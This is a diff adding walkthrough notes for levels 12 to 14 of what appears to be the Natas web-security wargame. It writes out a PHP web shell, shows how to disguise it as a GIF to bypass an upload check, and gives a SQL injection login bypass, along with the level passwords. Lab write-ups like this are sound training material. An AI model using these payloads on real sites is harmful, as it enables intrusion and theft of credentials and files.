@@ -66,3 +66,22 @@ Level 11: (decode and encode done using https://gchq.github.io/CyberChef/)
 	- now replace the old cookie's data and reload
 	- Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
+Level 12: (implements client-side filtering bypass)
+	- create a php file
+	- type the following '<?php echo shell_exec($_GET['q'].' 2>&1'); ?>'
+	- in the inspector change the input's value to a '.php' instead of '.jpg'
+	- upload the php file
+	- append /upload/{$randomFileName}.php in the URL
+	- now in the URL type the query 'q=cat%20/etc/natas_webpass/natas13'
+	- Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 
+
+Level 13: (tricking the exif_imagetype() function)
+	- same as previous level but the php file has the following 'GIF87a<?php echo shell_exec($_GET['q'].' 2>&1'); ?>'
+	- this fools the function to thinking that the file is .gif (look up magic headers/signature)
+	- the URL query is 'q=cat%20/etc/natas_webpass/natas14'
+	- Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+Level 14: (SQL Injection)
+	- in username type '1" OR 1=1 OR "' and keep password empty
+	- Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+ 
